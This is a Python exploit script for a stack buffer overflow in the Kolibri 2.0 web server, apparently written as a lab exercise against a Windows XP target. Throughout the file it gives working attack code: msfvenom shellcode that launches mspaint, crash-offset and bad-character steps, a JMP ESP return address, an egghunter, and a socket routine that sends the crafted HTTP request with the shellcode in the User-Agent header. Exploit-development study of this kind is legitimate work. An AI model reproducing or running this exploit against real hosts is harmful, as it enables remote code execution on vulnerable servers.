#!/usr/bin/python3

# Kolibri 2.0
# This is a egghunter version
# Original exploit and vulnerable app available at: https://www.exploit-db.com/exploits/33027
# Exploit tested on Windows XP Pro SP3 FR

import socket
import os
import sys

ip = b"10.0.2.4"
port = 9090

#The shellcode

# msfvenom -p windows/exec CMD=mspaint -b '\x00,\x3f,\x20,\x0a,\x0d' -f python -v shellcode
shellcode =  b""
shellcode += b"\xda\xd9\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x31"
shellcode += b"\xba\xd1\xbb\x1c\xbb\x83\xed\xfc\x31\x55\x13"
shellcode += b"\x03\x84\xa8\xfe\x4e\xda\x27\x7c\xb0\x22\xb8"
shellcode += b"\xe1\x38\xc7\x89\x21\x5e\x8c\xba\x91\x14\xc0"
shellcode += b"\x36\x59\x78\xf0\xcd\x2f\x55\xf7\x66\x85\x83"
shellcode += b"\x36\x76\xb6\xf0\x59\xf4\xc5\x24\xb9\xc5\x05"
shellcode += b"\x39\xb8\x02\x7b\xb0\xe8\xdb\xf7\x67\x1c\x6f"
shellcode += b"\x4d\xb4\x97\x23\x43\xbc\x44\xf3\x62\xed\xdb"
shellcode += b"\x8f\x3c\x2d\xda\x5c\x35\x64\xc4\x81\x70\x3e"
shellcode += b"\x7f\x71\x0e\xc1\xa9\x4b\xef\x6e\x94\x63\x02"
shellcode += b"\x6e\xd1\x44\xfd\x05\x2b\xb7\x80\x1d\xe8\xc5"
shellcode += b"\x5e\xab\xea\x6e\x14\x0b\xd6\x8f\xf9\xca\x9d"
shellcode += b"\x9c\xb6\x99\xf9\x80\x49\x4d\x72\xbc\xc2\x70"
shellcode += b"\x54\x34\x90\x56\x70\x1c\x42\xf6\x21\xf8\x25"
shellcode += b"\x07\x31\xa3\x9a\xad\x3a\x4e\xce\xdf\x61\x05"
shellcode += b"\x11\x6d\x1c\x6b\x11\x6d\x1e\xdc\x7a\x5c\x95"
shellcode += b"\xb3\xfd\x61\x7c\xf0\xf2\x2b\xdc\x51\x9b\xf5"
shellcode += b"\xb5\xe3\xc6\x05\x60\x27\xff\x85\x80\xd8\x04"
shellcode += b"\x95\xe1\xdd\x41\x11\x1a\xac\xda\xf4\x1c\x03"
shellcode += b"\xda\xdc\x71\xd0\x54\xbe\xe0\x78\xe1\x40"
#Adding the egg to the shellcode
shellcode = b"bite"*2 + shellcode

useragent = b"Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12"

#Step 1: Replicate the crash
payload = b"A"*600

#Step 2: Find the offset
payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"

#Step 3: Check the offset
payload = b"A"*515 + b"BBBB" + b"C" * (600-515-4)

#Step 4: Find bad char (\x00,\x3f,\x20)
badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
badchars += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
badchars += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = badchars + b"A"*(515-len(badchars)) + b"BBBB" + b"C" * (600-515-4)

#Step 5: Just JMP ESP
# 0x77f8b227 : jmp esp |  {PAGE_EXECUTE_READ} [SHLWAPI.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v6.00.2900.5512 (C:\WINDOWS\system32\SHLWAPI.dll)
payload = b"A"*515 + b"\x27\xb2\xf8\x77" + b"C" * (600-515-4)

#Step 6: Find somewhere to put data
useragent = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

#Step 7: The egghunter (from skape - http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
#This is my 9 years old myself speaking
egghunter = (b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8" + b"bite" + b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# "\xEB\xC4" JMP -0x60
#payload = b"A"*(510 - len(egghunter)) +  + b"A"*5 + b"\x27\xb2\xf8\x77" + egghunter
payload = b"A"*515 + b"\x27\xb2\xf8\x77" + egghunter
payload += b"C"*(600-len(payload))

#Step 8: Final exploit
#Just replace the useragent with the shellcode -> As this is in HTTP header, 0x0a and 0x0d are avoided
useragent = shellcode

#Exploit part

buffer = (
b"GET /" + payload + b" HTTP/1.1\r\n"
b"Host: " + ip + b"\r\n"
b"User-Agent: " + useragent + b"\r\n"
b"Keep-Alive: 115\r\n"
b"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = expl.connect((ip, port))
expl.send(buffer)
expl.close()
